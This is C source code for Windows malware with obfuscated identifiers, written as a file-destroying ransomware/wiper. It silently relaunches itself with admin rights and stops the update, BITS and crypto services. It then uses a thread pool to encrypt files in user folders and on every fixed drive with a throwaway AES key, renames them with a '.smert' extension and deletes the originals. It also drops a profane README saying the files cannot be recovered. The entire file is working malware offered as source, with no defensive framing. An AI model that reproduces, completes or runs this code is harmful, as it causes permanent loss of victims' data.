#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <conio.h>
#include <time.h>
#include <psapi.h>
#include <tchar.h>
#include <bcrypt.h>
#include <threadpoolapiset.h>

#define VAR1 4096

#define X(s) (s[0]^s[1])
#define XSTR(s) X(s), s[1]

#define _str(s) #s
#define obf_str(s) _str(XSTR(s))

typedef struct {
    char *VAR2;
    unsigned char VAR3[32];
    unsigned char VAR4[16];
} CustomStruct;

void FUNC1(const char *VAR5, const unsigned char *VAR6, const unsigned char *VAR7);
void FUNC2(const char *VAR8, const unsigned char *VAR6, const unsigned char *VAR7, int VAR9);
int FUNC3();
void FUNC4();
void FUNC5(unsigned char *VAR10, size_t VAR11);
void FUNC6(unsigned char *VAR6, unsigned char *VAR7);
void FUNC7(unsigned char *VAR6, unsigned char *VAR7);

TP_CALLBACK_ENVIRON OTH1;
PTP_POOL OTH2;
PTP_CLEANUP_GROUP OTH3;

void CALLBACK OTH4(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_WORK work) {
    CustomStruct *VAR12 = (CustomStruct *)context;
    FUNC1(VAR12->VAR2, VAR12->VAR3, VAR12->VAR4);
    free(VAR12->VAR2);
    free(VAR12);
}

void FUNC8() {
    OTH2 = CreateThreadpool(NULL);
    if (!OTH2) {
        printf("tpcf: %d\n", GetLastError());
        exit(1);
    }

    OTH3 = CreateThreadpoolCleanupGroup();
    if (!OTH3) {
        printf("pf: %d\n", GetLastError());
        CloseThreadpool(OTH2);
        exit(1);
    }

    InitializeThreadpoolEnvironment(&OTH1);
    SetThreadpoolCallbackPool(&OTH1, OTH2);
    SetThreadpoolCallbackCleanupGroup(&OTH1, OTH3, NULL);
}

void FUNC9() {
    CloseThreadpoolCleanupGroupMembers(OTH3, FALSE, NULL);
    CloseThreadpoolCleanupGroup(OTH3);
    CloseThreadpool(OTH2);
}

int FUNC10() {
    BOOL VAR13 = FALSE;
    PSID VAR14;
    SID_IDENTIFIER_AUTHORITY VAR15 = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&VAR15, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &VAR14)) {
        CheckTokenMembership(NULL, VAR14, &VAR13);
        FreeSid(VAR14);
    }
    return VAR13;
}

void FUNC11() {
    if (!FUNC10()) {
        TCHAR VAR16[MAX_PATH];
        if (GetModuleFileName(NULL, VAR16, ARRAYSIZE(VAR16))) {
            SHELLEXECUTEINFO VAR17 = { sizeof(VAR17) };
            VAR17.lpVerb = _T("runas");
            VAR17.lpFile = VAR16;
            VAR17.lpParameters = _T("--food");
            VAR17.hwnd = NULL;
            VAR17.nShow = SW_HIDE;

            if (!ShellExecuteEx(&VAR17)) {
                exit(1);
            }
            exit(0);
        }
    }
}

void FUNC12() {
    SC_HANDLE VAR18 = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (VAR18) {
        const char *VAR19[] = { "wuauserv", "bits", "cryptsvc" };
        for (int VAR20 = 0; VAR20 < sizeof(VAR19) / sizeof(VAR19[0]); VAR20++) {
            SC_HANDLE VAR21 = OpenService(VAR18, VAR19[VAR20], SERVICE_STOP | SERVICE_QUERY_STATUS);
            if (VAR21) {
                SERVICE_STATUS VAR22;
                if (ControlService(VAR21, SERVICE_CONTROL_STOP, &VAR22)) {
                    printf("s %s st.\n", VAR19[VAR20]);
                }
                CloseServiceHandle(VAR21);
            }
        }
        CloseServiceHandle(VAR18);
    }
}

void FUNC1(const char *VAR5, const unsigned char *VAR6, const unsigned char *VAR7) {
    char VAR23[MAX_PATH];
    GetModuleFileName(NULL, VAR23, MAX_PATH);
    if (strstr(VAR5, obf_str(".exe")) || _stricmp(VAR5, VAR23) == 0) {
        return;
    }

    FILE *VAR24 = fopen(VAR5, "rb");
    if (!VAR24) return;

    char VAR25[256];
    snprintf(VAR25, sizeof(VAR25), "%s.smert", VAR5);

    FILE *VAR26 = fopen(VAR25, "wb");
    if (!VAR26) {
        fclose(VAR24);
        return;
    }

    HCRYPTPROV VAR27;
    HCRYPTKEY VAR28;
    HCRYPTHASH VAR29;

    if (!CryptAcquireContext(&VAR27, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        fclose(VAR24);
        fclose(VAR26);
        return;
    }

    if (!CryptCreateHash(VAR27, CALG_SHA_256, 0, 0, &VAR29)) {
        CryptReleaseContext(VAR27, 0);
        fclose(VAR24);
        fclose(VAR26);
        return;
    }

    if (!CryptHashData(VAR29, VAR6, 32, 0)) {
        CryptDestroyHash(VAR29);
        CryptReleaseContext(VAR27, 0);
        fclose(VAR24);
        fclose(VAR26);
        return;
    }

    if (!CryptDeriveKey(VAR27, CALG_AES_256, VAR29, 0, &VAR28)) {
        CryptDestroyHash(VAR29);
        CryptReleaseContext(VAR27, 0);
        fclose(VAR24);
        fclose(VAR26);
        return;
    }

    CryptDestroyHash(VAR29);

    if (!CryptSetKeyParam(VAR28, KP_IV, VAR7, 0)) {
        CryptDestroyKey(VAR28);
        CryptReleaseContext(VAR27, 0);
        fclose(VAR24);
        fclose(VAR26);
        return;
    }

    unsigned char VAR30[VAR1];
    unsigned char VAR31[VAR1 + 16];
    DWORD VAR32, VAR33;

    while ((VAR32 = fread(VAR30, 1, VAR1, VAR24)) > 0) {
        VAR33 = VAR32;
        if (!CryptEncrypt(VAR28, 0, feof(VAR24), 0, VAR31, &VAR33, sizeof(VAR31))) {
            CryptDestroyKey(VAR28);
            CryptReleaseContext(VAR27, 0);
            fclose(VAR24);
            fclose(VAR26);
            return;
        }
        fwrite(VAR31, 1, VAR33, VAR26);
    }

    CryptDestroyKey(VAR28);
    CryptReleaseContext(VAR27, 0);

    fclose(VAR24);
    fclose(VAR26);

    remove(VAR5);
}

int FUNC13(const char *VAR8) {
    char VAR34[256];
    snprintf(VAR34, sizeof(VAR34), "%s\\README.txt", VAR8);
    struct stat VAR35;
    return (stat(VAR34, &VAR35) == 0);
}

void FUNC14(const char *VAR8) {
    if (FUNC13(VAR8)) {
        return;
    }
    char VAR34[256];
    snprintf(VAR34, sizeof(VAR34), "%s\\README.txt", VAR8);

    FILE *VAR36 = fopen(VAR34, "w");
    if (VAR36) {
        fprintf(VAR36, "Hello.\n Well, you got fucked. more specifically your files are.\nThere's no way to recover the files cuz im not gonna be a retard and demand shit.\n");
        fclose(VAR36);
    }
}

int FUNC15(const char *VAR8) {
    const char *VAR37[] = {
        "C:\\Windows",
        "C:\\Users\\Default",
        "C:\\Users\\Public",
        NULL
    };

    for (int VAR20 = 0; VAR37[VAR20] != NULL; VAR20++) {
        if (_stricmp(VAR8, VAR37[VAR20]) == 0) {
            return 1;
        }
    }
    return 0;
}

int FUNC16() {
    MEMORYSTATUSEX VAR38;
    VAR38.dwLength = sizeof(VAR38);
    GlobalMemoryStatusEx(&VAR38);

    if (VAR38.dwMemoryLoad > 80) {
        return 0;
    }

    FILETIME VAR39, VAR40, VAR41;
    if (GetSystemTimes(&VAR39, &VAR40, &VAR41)) {
        static ULARGE_INTEGER VAR42 = { 0 };
        static ULARGE_INTEGER VAR43 = { 0 };
        static ULARGE_INTEGER VAR44 = { 0 };

        ULARGE_INTEGER VAR45, VAR46, VAR47;

        VAR45.LowPart = VAR39.dwLowDateTime;
        VAR45.HighPart = VAR39.dwHighDateTime;
        VAR46.LowPart = VAR40.dwLowDateTime;
        VAR46.HighPart = VAR40.dwHighDateTime;
        VAR47.LowPart = VAR41.dwLowDateTime;
        VAR47.HighPart = VAR41.dwHighDateTime;

        ULONGLONG VAR48 = VAR45.QuadPart - VAR42.QuadPart;
        ULONGLONG VAR49 = VAR46.QuadPart - VAR43.QuadPart;
        ULONGLONG VAR50 = VAR47.QuadPart - VAR44.QuadPart;

        ULONGLONG VAR51 = VAR49 + VAR50;
        double VAR52 = (VAR51 - VAR48) * 100.0 / VAR51;

        VAR42 = VAR45;
        VAR43 = VAR46;
        VAR44 = VAR47;

        return VAR52 < 80;
    }

    return 1;
}

void FUNC2(const char *VAR8, const unsigned char *VAR6, const unsigned char *VAR7, int VAR9) {
    WIN32_FIND_DATA VAR53;
    HANDLE VAR54;
    char VAR55[512];
    char VAR56[512];

    if (FUNC15(VAR8)) {
        return;
    }

    snprintf(VAR55, sizeof(VAR55), "%s\\*", VAR8);
    VAR54 = FindFirstFile(VAR55, &VAR53);

    if (VAR54 == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(VAR53.cFileName, ".") != 0 && strcmp(VAR53.cFileName, "..") != 0) {
            snprintf(VAR56, sizeof(VAR56), "%s\\%s", VAR8, VAR53.cFileName);

            if (VAR53.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (VAR9 < 3) {
                    FUNC2(VAR56, VAR6, VAR7, VAR9 + 1);
                }
            } else {
                const char *VAR57 = strrchr(VAR53.cFileName, '.');
                if (!FUNC13(VAR8) && (VAR57 == NULL || _stricmp(VAR57, ".lnk") != 0)) {
                    FUNC14(VAR8);
                }

                CustomStruct *VAR12 = (CustomStruct *)malloc(sizeof(CustomStruct));
                VAR12->VAR2 = _strdup(VAR56);
                memcpy(VAR12->VAR3, VAR6, 32);
                memcpy(VAR12->VAR4, VAR7, 16);

                PTP_WORK VAR58 = CreateThreadpoolWork(OTH4, VAR12, &OTH1);
                if (VAR58) {
                    SubmitThreadpoolWork(VAR58);
                } else {
                    free(VAR12->VAR2);
                    free(VAR12);
                }
            }
        }
    } while (FindNextFile(VAR54, &VAR53) != 0);

    FindClose(VAR54);
}

void FUNC17(const unsigned char *VAR6, const unsigned char *VAR7, int VAR9) {
    KNOWNFOLDERID VAR59[] = { FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Pictures, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Contacts, FOLDERID_Favorites, FOLDERID_Links, FOLDERID_SavedGames, GUID_NULL };
    PWSTR VAR60;

    for (int VAR20 = 0; !IsEqualGUID(&VAR59[VAR20], &GUID_NULL); VAR20++) {
        if (SHGetKnownFolderPath(&VAR59[VAR20], 0, NULL, &VAR60) == S_OK) {
            char VAR61[MAX_PATH];
            wcstombs(VAR61, VAR60, MAX_PATH);
            FUNC2(VAR61, VAR6, VAR7, VAR9);
            CoTaskMemFree(VAR60);
        }
    }

    for (char VAR62 = 'A'; VAR62 <= 'Z'; VAR62++) {
        char VAR63[4] = { VAR62, ':', '\\', '\0' };
        if (GetDriveType(VAR63) == DRIVE_FIXED) {
            FUNC2(VAR63, VAR6, VAR7, VAR9);
        }
    }
}

void FUNC5(unsigned char *VAR10, size_t VAR11) {
    for (size_t VAR20 = 0; VAR20 < VAR11; VAR20++) {
        VAR10[VAR20] ^= 0xAA;
    }
}

void FUNC6(unsigned char *VAR6, unsigned char *VAR7) {
    HCRYPTPROV VAR27;
    if (CryptAcquireContext(&VAR27, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(VAR27, 32, VAR6);
        CryptGenRandom(VAR27, 16, VAR7);
        CryptReleaseContext(VAR27, 0);

        FUNC5(VAR6, 32);
        FUNC5(VAR7, 16);
    } else {
        exit(1);
    }
}

void FUNC7(unsigned char *VAR6, unsigned char *VAR7) {
    FUNC5(VAR6, 32);
    FUNC5(VAR7, 16);
}

int main(int VAR64, char *VAR65[]) {
    if (VAR64 < 2) {
        FUNC11();
        ShellExecute(NULL, "open", VAR65[0], "--food", NULL, SW_HIDE);
        return 0;
    }

    unsigned char VAR6[32];
    unsigned char VAR7[16];

    FUNC6(VAR6, VAR7);

    FUNC12();

    FUNC7(VAR6, VAR7);

    FUNC8();

    if (strcmp(VAR65[1], "--food") == 0) {
        FUNC17(VAR6, VAR7, 0);
    } else {
        return 1;
    }

    FUNC9();

    return 0;
}
